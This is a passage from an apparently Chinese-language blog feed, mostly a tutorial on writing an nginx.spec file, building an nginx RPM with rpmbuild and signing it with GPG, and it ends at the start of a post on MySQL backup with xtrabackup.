class="line">    configtest)</div><div class="line">        configtest</div><div class="line">        ;;</div><div class="line">    *)</div><div class="line">        <span class="built_in">echo</span> $<span class="string">"Usage: <span class="variable">$prog</span> &#123;start|stop|restart|condrestart|try-restart|force-reload|upgrade|reload|status|help|configtest&#125;"</span></div><div class="line">        RETVAL=2</div><div class="line"><span class="keyword">esac</span></div><div class="line"></div><div class="line"><span class="built_in">exit</span> <span class="variable">$RETVAL</span></div></pre></td></tr></table></figure>
<h4 id="3-4-3-4-fastcgi-params-参数"><a href="#3-4-3-4-fastcgi-params-参数" class="headerlink" title="3.4.3.4 fastcgi_params 参数"></a>3.4.3.4 fastcgi_params 参数</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">fastcgi_param  QUERY_STRING       <span class="variable">$query_string</span>;</div><div class="line">fastcgi_param  REQUEST_METHOD     <span class="variable">$request_method</span>;</div><div class="line">fastcgi_param  CONTENT_TYPE       <span class="variable">$content_type</span>;</div><div class="line">fastcgi_param  CONTENT_LENGTH     <span class="variable">$content_length</span>;</div><div class="line"></div><div class="line">fastcgi_param  SCRIPT_NAME        <span class="variable">$fastcgi_script_name</span>;</div><div class="line">fastcgi_param  REQUEST_URI        <span class="variable">$request_uri</span>;</div><div class="line">fastcgi_param  DOCUMENT_URI       <span class="variable">$document_uri</span>;</div><div class="line">fastcgi_param  DOCUMENT_ROOT      <span class="variable">$document_root</span>;</div><div class="line">fastcgi_param  SERVER_PROTOCOL    <span class="variable">$server_protocol</span>;</div><div class="line">fastcgi_param  HTTPS              <span class="variable">$https</span> if_not_empty;</div><div class="line"></div><div class="line">fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;</div><div class="line">fastcgi_param  SERVER_SOFTWARE    nginx/<span class="variable">$nginx_version</span>;</div><div class="line"></div><div class="line">fastcgi_param  REMOTE_ADDR        <span class="variable">$remote_addr</span>;</div><div class="line">fastcgi_param  REMOTE_PORT        <span class="variable">$remote_port</span>;</div><div class="line">fastcgi_param  SERVER_ADDR        <span class="variable">$server_addr</span>;</div><div class="line">fastcgi_param  SERVER_PORT        <span class="variable">$server_port</span>;</div><div class="line">fastcgi_param  SERVER_NAME        <span class="variable">$server_name</span>;</div><div class="line"></div><div class="line"><span class="comment"># PHP only, required if PHP was built with --enable-force-cgi-redirect</span></div><div class="line">fastcgi_param  REDIRECT_STATUS    200;</div></pre></td></tr></table></figure>
<h3 id="3-4-4-在-SPECS-目录下创建-nginx-spec"><a href="#3-4-4-在-SPECS-目录下创建-nginx-spec" class="headerlink" title="3.4.4 在 SPECS 目录下创建 nginx.spec"></a>3.4.4 在 SPECS 目录下创建 nginx.spec</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> rpmbuild/SPECS/</div><div class="line">$ vim nginx.spec     <span class="comment">#此时，里面就是一个模板，直接填就可以了</span></div><div class="line"> </div><div class="line"><span class="comment"># 1.The introduction section</span></div><div class="line"> </div><div class="line">Name: nginx           <span class="comment"># 软件包名称</span></div><div class="line">Version: 1.8.1        <span class="comment"># 版本号，（不能使用-）</span></div><div class="line">Release: 1%&#123;?dist&#125;    <span class="comment"># release号，对应下面的changelog，如 nginx-1.8.1-1.el6.x86_64.rpm</span></div><div class="line">Summary: nginx-1.8.1.tar.gz to nginx-1.8.1.rpm   <span class="comment"># 简要描述信息，最好不要超过50个字符，如要详述，使用下面的%description</span></div><div class="line">Group: Applications/Archiving      <span class="comment"># 要全用这里面的一个组：less /usr/share/doc/rpm-version/GROUPS</span></div><div class="line">License: GPLv2                     <span class="comment"># 一定带上（最好是对方源码包的License）BSD，GPL，GPLv2</span></div><div class="line">URL: http://nginx.org</div><div class="line">Packager: go2.cn</div><div class="line">Vendor: go2.cn</div><div class="line">Source0: %&#123;name&#125;-%&#123;version&#125;.tar.gz     <span class="comment"># source主要是引用一下自己定义好的脚本，配置文件之类的内容。</span></div><div class="line">Source1: nginx                         <span class="comment"># nginx在主配置文件里面做了很多优化，包括cpu抢占，各种缓存策略，tcp，进程数等。</span></div><div class="line">Source2: nginx.conf                    <span class="comment"># 每增加一个 Source ，都需要在 %install 段和 %files 段做相应配置，如果是启动脚本的话，最好在脚本段配置一下</span></div><div class="line">Source3: fastcgi_params</div><div class="line">BuildRoot: %_topdir/BUILDROOT</div><div class="line"> </div><div class="line">BuildRequires: gcc</div><div class="line">Requires: openssl,openssl-devel,pcre-devel,pcre  <span class="comment"># 定义nginx依赖的包，需要yum安装</span></div><div class="line"> </div><div class="line">%description              <span class="comment"># 软件包详述</span></div><div class="line">Custom a rpm by yourself!Build nginx-1.8.1.tar.gz to nginx-1.8.1.rpm</div><div class="line"> </div><div class="line"><span class="comment"># 2.The Prep section 准备阶段,主要就是把源码包解压到build目录下，设置一下环境变量，并cd进去</span></div><div class="line"> </div><div class="line">%prep</div><div class="line">%setup -q    <span class="comment"># 这个宏的作用静默模式解压并cd</span></div><div class="line"> </div><div class="line"><span class="comment"># 3.The Build Section 编译制作阶段，这一节主要用于编译源码</span></div><div class="line"> </div><div class="line">%build</div><div class="line"> </div><div class="line">%configure      <span class="comment">#在 RMP 创建时候, 由于 nginx 不按照常规定义, 不可以定义 %&#123;_prefix&#125; 之类参数, 也不可以使用 %configure 这个参数进行 rpm 编译  </span></div><div class="line">                <span class="comment">#一旦定义该参数, 会导致编译自动增加下面参数, 导致报错</span></div><div class="line">                <span class="comment"># + ./configure --build=x86_64-redhat-linux-gnu --host=x86_64-redhat-linux-gnu --target=x86_64-redhat-linux-gnu --program-prefix=</span></div><div class="line">                <span class="comment">#因此，这里需要 ./configure，且需把%configure删掉</span></div><div class="line">                <span class="comment">#而且这里需要安装 pcre-devel包，如果没有的话，会提示关于pcre的错误，直接安装此包就可以了</span></div><div class="line"></div><div class="line">./configure \</div><div class="line">--prefix=/gotwo_data/Application/nginx \</div><div class="line">--sbin-path=/gotwo_data/Application/nginx/sbin/nginx \</div><div class="line">--conf-path=/gotwo_data/Application/nginx/conf/nginx.conf \</div><div class="line">--error-log-path=/gotwo_data/logs/nginx/error.log \</div><div class="line">--http-log-path=/gotwo_data/logs/nginx/access.log \</div><div class="line">--pid-path=/gotwo_data/logs/nginx/nginx.pid \</div><div class="line">--lock-path=/gotwo_data/logs/nginx/nginx.lock \</div><div class="line">--http-client-body-temp-path=/gotwo_data/Application/nginx/client_temp \</div><div class="line">--http-proxy-temp-path=/gotwo_data/Application/nginx/proxy_temp \</div><div class="line">--http-fastcgi-temp-path=/gotwo_data/Application/nginx/fastcgi_temp \</div><div class="line">--http-uwsgi-temp-path=/gotwo_data/Application/nginx/uwsgi_temp \</div><div class="line">--http-scgi-temp-path=/gotwo_data/Application/nginx/scgi_temp \</div><div class="line">--user=nginx \</div><div class="line">--group=nginx \</div><div class="line">--with-http_ssl_module \</div><div class="line">--with-http_realip_module \</div><div class="line">--with-http_addition_module \</div><div class="line">--with-http_sub_module \</div><div class="line">--with-http_dav_module \</div><div class="line">--with-http_flv_module \</div><div class="line">--with-http_mp4_module \</div><div class="line">--with-http_gunzip_module \</div><div class="line">--with-http_gzip_static_module \</div><div class="line">--with-http_random_index_module \</div><div class="line">--with-http_secure_link_module \</div><div class="line">--with-http_stub_status_module \</div><div class="line">--with-http_auth_request_module \</div><div class="line">--with-mail \</div><div class="line">--with-mail_ssl_module \</div><div class="line">--with-file-aio \</div><div class="line">--with-ipv6 \</div><div class="line">--with-http_spdy_module \</div><div class="line">--with-cc-opt=<span class="string">'-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic'</span></div><div class="line"></div><div class="line">make %&#123;?_smp_mflags&#125;     <span class="comment"># make后面的意思是：如果就多处理器的话make时并行编译</span></div><div class="line"> </div><div class="line"><span class="comment"># 4.Install section  这一节主要用于完成实际安装软件必须执行的命令，可包含4种类型脚本</span></div><div class="line"> </div><div class="line">%install</div><div class="line">rm -rf %&#123;buildroot&#125;</div><div class="line">make install DESTDIR=%&#123;buildroot&#125;</div><div class="line">%&#123;__install&#125; -p -D -m 0755 %&#123;SOURCE1&#125; %&#123;buildroot&#125;/etc/rc.d/init.d/nginx</div><div class="line">%&#123;__install&#125; -p -D %&#123;SOURCE2&#125; %&#123;buildroot&#125;/gotwo_data/Application/nginx/conf/nginx.conf</div><div class="line">%&#123;__install&#125; -p -D %&#123;SOURCE3&#125; %&#123;buildroot&#125;/gotwo_data/Application/nginx/conf/fastcgi_params</div><div class="line"> </div><div class="line">%pre</div><div class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> == 1 ];<span class="keyword">then</span>                                                           <span class="comment"># $1有3个值，代表动作，安装类型，处理类型</span></div><div class="line">        /usr/sbin/useradd -r nginx <span class="_">-s</span> /sbin/nologin 2&gt; /dev/null</div><div class="line"></div><div class="line">        mkdir -p /gotwo_data/logs/nginx                                       <span class="comment"># 1：表示安装</span></div><div class="line"><span class="keyword">fi</span>                                                                            <span class="comment"># 2：表示升级      </span></div><div class="line">                                                                              <span class="comment"># 0：表示卸载</span></div><div class="line">%post</div><div class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> == 1 ];<span class="keyword">then</span></div><div class="line">        /sbin/chkconfig --add %&#123;name&#125;</div><div class="line">        /sbin/chkconfig %&#123;name&#125; on</div><div class="line">        <span class="built_in">echo</span> <span class="string">'# Add  #下面主要是内核参数的优化，包括tcp的快速释放和重利用等。   </span></div><div class="line">net.ipv4.tcp_max_syn_backlog = 65536</div><div class="line">net.core.netdev_max_backlog =  32768</div><div class="line">net.core.somaxconn = 32768</div><div class="line"> </div><div class="line">net.core.wmem_default = 8388608</div><div class="line">net.core.rmem_default = 8388608</div><div class="line">net.core.rmem_max = 16777216</div><div class="line">net.core.wmem_max = 16777216</div><div class="line"> </div><div class="line">net.ipv4.tcp_timestamps = 0</div><div class="line">net.ipv4.tcp_synack_retries = 2</div><div class="line">net.ipv4.tcp_syn_retries = 2</div><div class="line"> </div><div class="line">net.ipv4.tcp_tw_recycle = 1</div><div class="line">net.ipv4.tcp_tw_reuse = 1</div><div class="line"> </div><div class="line">net.ipv4.tcp_mem = 94500000 915000000927000000</div><div class="line">net.ipv4.tcp_max_orphans = 3276800</div><div class="line"> </div><div class="line">#net.ipv4.tcp_fin_timeout = 30</div><div class="line">#net.ipv4.tcp_keepalive_time = 120</div><div class="line">net.ipv4.ip_local_port_range = 1024  65535' &gt;&gt; /etc/sysctl.conf</div><div class="line">sysctl -p 2&gt;&amp;1 /dev/null</div><div class="line"><span class="keyword">fi</span></div><div class="line"> </div><div class="line">%preun</div><div class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> == 0 ];<span class="keyword">then</span></div><div class="line">        /usr/sbin/userdel -r nginx 2&gt; /dev/null</div><div class="line">        /etc/init.d/nginx stop &gt; /dev/null 2&gt;&amp;1</div><div class="line"><span class="keyword">fi</span></div><div class="line">%postun</div><div class="line"> </div><div class="line"><span class="comment"># 5.clean section 清理段,clean的主要作用就是删除BUILD</span></div><div class="line"> </div><div class="line">%clean</div><div class="line">rm -rf %&#123;buildroot&#125;</div><div class="line"> </div><div class="line"><span class="comment"># 6.file section 文件列表段，这个阶段是把前面已经编译好的内容要打包了,其中exclude是指要排除什么不打包进来。</span></div><div class="line"> </div><div class="line">%files              </div><div class="line">%defattr(-,root,root,0755)</div><div class="line">/usr/<span class="built_in">local</span>/nginx/</div><div class="line">%attr(0755,root,root) /etc/rc.d/init.d/nginx</div><div class="line">%config(noreplace) /gotwo_data/Application/nginx/conf/nginx.conf</div><div class="line">%config(noreplace) /gotwo_data/Application/nginx/conf/fastcgi_params</div><div class="line"> </div><div class="line"><span class="comment"># 7.chagelog section  日志改变段， 这一段主要描述软件的开发记录</span></div><div class="line"> </div><div class="line">%changelog</div><div class="line">*  Thu Nov 16  2016 go2.cn &lt;yunwei@stargoto.com&gt; - 1.8.1-1</div><div class="line">- Initial version</div></pre></td></tr></table></figure>
<h3 id="3-4-5-制作rpm包"><a href="#3-4-5-制作rpm包" class="headerlink" title="3.4.5 制作rpm包"></a>3.4.5 制作rpm包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">rpmbuild -bp nginx.spec 制作到%prep段</div><div class="line">rpmbuild -bc nginx.spec 制作到%build段</div><div class="line">rpmbuild -bi nginx.spec 执行 spec 文件的 &quot;%install&quot; 阶段 (在执行了 %prep 和 %build 阶段之后)。这通常等价于执行了一次 &quot;make install&quot;</div><div class="line">rpmbuild -bb nginx.spec 制作二进制包</div><div class="line">rpmbuild -ba nginx.spec 表示既制作二进制包又制作src格式包</div></pre></td></tr></table></figure>
<h2 id="3-5-rpm包的签名"><a href="#3-5-rpm包的签名" class="headerlink" title="3.5 rpm包的签名"></a>3.5 rpm包的签名</h2><h3 id="3-5-1-查询软件包信息"><a href="#3-5-1-查询软件包信息" class="headerlink" title="3.5.1 查询软件包信息"></a>3.5.1 查询软件包信息</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># rpm -qi nginx</span></div><div class="line">Name        : nginx                        Relocations: (not relocatable)</div><div class="line">Version     : 1.7.7                             Vendor: nmshuishui</div><div class="line">Release     : 3.el6                         Build Date: Wed 26 Nov 2014 06:39:00 PM CST</div><div class="line">Install Date: Wed 26 Nov 2014 06:42:19 PM CST      Build Host: localhost</div><div class="line">Group       : Applications/Archiving        Source RPM: nginx-1.7.7-3.el6.src.rpm</div><div class="line">Size        : 793593                           License: GPLv2</div><div class="line">Signature   : (none)    <span class="comment"># rpm包未签名状态</span></div><div class="line">Packager    : nmshuishui &lt;353025240@qq.com&gt;</div><div class="line">URL         : http://nmshuishui.blog.51cto.com/</div><div class="line">Summary     : nginx-1.7.7.tar.gz to nginx-1.7.7.rpm</div><div class="line">Description :</div><div class="line">Custom a rpm by yourself!Build nginx-1.7.7.tar.gz to nginx-1.7.7.rpm</div></pre></td></tr></table></figure>
<h3 id="3-5-2-使用gpg方式生成签名密钥"><a href="#3-5-2-使用gpg方式生成签名密钥" class="headerlink" title="3.5.2 使用gpg方式生成签名密钥"></a>3.5.2 使用gpg方式生成签名密钥</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># gpg --gen-key</span></div><div class="line">Your selection?1&lt;Enter&gt;  <span class="comment">#默认即可</span></div><div class="line">What keysize <span class="keyword">do</span> you want? (2048) 1024&lt;Enter&gt;  <span class="comment">#选择密钥长度</span></div><div class="line">Key is valid <span class="keyword">for</span>? (0) 1y&lt;Enter&gt;  <span class="comment">#有效期</span></div><div class="line">Is this correct? (y/N) y&lt;Enter&gt;  <span class="comment">#确认</span></div><div class="line">Real name: nmshuishui&lt;Enter&gt;  <span class="comment">#密钥名称</span></div><div class="line">Email address: 353025240@qq.com&lt;Enter&gt;  <span class="comment">#邮件</span></div><div class="line">Comment: GPG-RPM-KEY&lt;Enter&gt;  <span class="comment">#备注</span></div><div class="line">Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O&lt;ENTER&gt; <span class="comment">#okay确认</span></div><div class="line">Enter passphrase  OK &lt;Enter&gt;  <span class="comment">#按Enter输入密码                    </span></div><div class="line">&lt;Take this one anyway&gt; &lt;Enter&gt; <span class="comment">#确认使用此密码</span></div></pre></td></tr></table></figure>
<p>　　在生成密钥的时候，会报这么一个信息：can’t connect to `/root/.gnupg/S.gpg-agent’: No such file or directory，可以不用理会它。<br>接下来就是一些随机数的说明了：</p>
<p>　　We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy.</p>
<p>　　就狂敲键盘和移动鼠标吧，也可以链接一个伪随机数（不过不安全），接下来的活儿就是等了</p>
<p>　　生成密钥后会是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gpg: checking the trustdb</div><div class="line">gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model</div><div class="line">gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u</div><div class="line">pub   2048R/DF63EDFB 2014-11-26</div><div class="line">      Key fingerprint = 338D 476F 29C9 E2D6 6604  1D96 6F73 1E81 DF63 EDFB</div><div class="line">uid                  nmshuishui (gen-key) &lt;353025240@qq.com&gt;</div><div class="line">sub   2048R/263FB359 2014-11-26</div></pre></td></tr></table></figure>
<h3 id="3-5-3-查看生成的密钥"><a href="#3-5-3-查看生成的密钥" class="headerlink" title="3.5.3 查看生成的密钥"></a>3.5.3 查看生成的密钥</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># gpg --list-keys</span></div><div class="line">/root/.gnupg/pubring.gpg</div><div class="line">------------------------</div><div class="line">pub   2048R/DF63EDFB 2014-11-26</div><div class="line">uid                  nmshuishui (gen-key) &lt;353025240@qq.com&gt;</div><div class="line">sub   2048R/263FB359 2014-11-26</div></pre></td></tr></table></figure>
<h3 id="3-5-4-导出公钥以供验证"><a href="#3-5-4-导出公钥以供验证" class="headerlink" title="3.5.4 导出公钥以供验证"></a>3.5.4 导出公钥以供验证</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># gpg --export -a "nmshuishui" &gt; RPM-GPG-KEY-nmshuishui</span></div></pre></td></tr></table></figure>
<h3 id="3-5-5-在-rpmmacros宏中定义加密密钥"><a href="#3-5-5-在-rpmmacros宏中定义加密密钥" class="headerlink" title="3.5.5 在~/.rpmmacros宏中定义加密密钥"></a>3.5.5 在~/.rpmmacros宏中定义加密密钥</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># vim ~/.rpmmacros</span></div><div class="line">%_gpg_name nmshuishui</div></pre></td></tr></table></figure>
<h3 id="3-5-6-为rpm包签名"><a href="#3-5-6-为rpm包签名" class="headerlink" title="3.5.6 为rpm包签名"></a>3.5.6 为rpm包签名</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># rpm --addsign /home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm </span></div><div class="line">Enter pass phrase: </div><div class="line">Pass phrase is good.</div><div class="line">/home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm:</div></pre></td></tr></table></figure>
<h3 id="3-5-7-将公钥导入rpm包"><a href="#3-5-7-将公钥导入rpm包" class="headerlink" title="3.5.7 将公钥导入rpm包"></a>3.5.7 将公钥导入rpm包</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># rpm --import RPM-GPG-KEY-nmshuishui</span></div></pre></td></tr></table></figure>
<h3 id="3-5-8-验证"><a href="#3-5-8-验证" class="headerlink" title="3.5.8 验证"></a>3.5.8 验证</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># rpm --checksig /home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm</span></div><div class="line">/home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm: rsa sha1 (md5) pgp md5 OK</div></pre></td></tr></table></figure>
<h3 id="3-5-9-重新安装nginx，验证安装包的签名信息"><a href="#3-5-9-重新安装nginx，验证安装包的签名信息" class="headerlink" title="3.5.9 重新安装nginx，验证安装包的签名信息"></a>3.5.9 重新安装nginx，验证安装包的签名信息</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]<span class="comment"># rpm -ivh /home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm </span></div><div class="line">Preparing...                <span class="comment">########################################### [100%]</span></div><div class="line">   1:nginx                  <span class="comment">########################################### [100%]</span></div><div class="line">[root@localhost ~]<span class="comment"># </span></div><div class="line">[root@localhost ~]<span class="comment"># rpm -qi nginx</span></div><div class="line">Name        : nginx                        Relocations: (not relocatable)</div><div class="line">Version     : 1.7.7                             Vendor: nmshuishui</div><div class="line">Release     : 3.el6                         Build Date: Wed 26 Nov 2014 06:39:00 PM CST</div><div class="line">Install Date: Thu 27 Nov 2014 10:58:44 AM CST      Build Host: localhost</div><div class="line">Group       : Applications/Archiving        Source RPM: nginx-1.7.7-3.el6.src.rpm</div><div class="line">Size        : 793593                           License: GPLv2</div><div class="line">Signature   : RSA/SHA1, Thu 27 Nov 2014 10:40:02 AM CST, Key ID 6f731e81df63edfb   <span class="comment"># 与 1 比起来，多了签名信息</span></div><div class="line">Packager    : nmshuishui &lt;353025240@qq.com&gt;</div><div class="line">URL         : http://nmshuishui.blog.51cto.com/</div><div class="line">Summary     : nginx-1.7.7.tar.gz to nginx-1.7.7.rpm</div><div class="line">Description :</div><div class="line">Custom a rpm by yourself!Build nginx-1.7.7.tar.gz to nginx-1.7.7.rpm</div></pre></td></tr></table></figure>
<p>到这里，一个完整的 rpm 包就制作完成了！</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一-rpm包安装&quot;&gt;&lt;a href=&quot;#一-rpm包安装&quot; class=&quot;headerlink&quot; title=&quot;一. rpm包安装&quot;&gt;&lt;/a&gt;一. rpm包安装&lt;/h1&gt;&lt;h2 id=&quot;1-1-配置nginx-官方yum源用以安装最新稳定版&quot;&gt;&lt;a href=&quot;#1-1-配置nginx-官方yum源用以安装最新稳定版&quot; class=&quot;headerlink&quot; title=&quot;1.1 配置nginx 官方yum源用以安装最新稳定版&quot;&gt;&lt;/a&gt;1.1 配置nginx 官方yum源用以安装最新稳定版&lt;/h2&gt;&lt;p&gt;　　用以下内容为模板，创建nginx软件源文件: “/etc/yum.repos.d/nginx.repo” &lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[nginx]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;name=nginx repo&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;baseurl=http://nginx.org/packages/OS/OSRELEASE/$basearch/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;gpgcheck=0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;enabled=1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;　　其中“OS” 用 “centos”替代, 根据不同的系统版本， “OSRELEASE” 用“5”, “6”, 或者“7”替代&lt;/p&gt;
&lt;p&gt;　　下面给出一个范例：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[nginx]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;name=nginx repo&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;baseurl=http://nginx.org/packages/centos/6/$basearch/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;gpgcheck=0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;enabled=1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="nginx" scheme="http://www.unix-like.com/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>用innobackup备份恢复mysql</title>
    <link href="http://www.unix-like.com/2017/06/09/database/%E7%94%A8innobackup%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8Dmysql/"/>
    <id>http://www.unix-like.com/2017/06/09/database/用innobackup备份恢复mysql/</id>
    <published>2017-06-09T12:54:42.000Z</published>
    <updated>2017-06-09T12:57:21.432Z</updated>
    
    <content type="html"><![CDATA[<p>一般mysql的备份还原会使用mysql自带的mysqldump，但是当数据库比较大多时候，使用mysqldump备份恢复数据库耗时相当的长。为了尽可能的缩短mysql数据库备份恢复的时间窗口，可以使用percona提供的第三方工具xtrabackup来备份还原。</p>
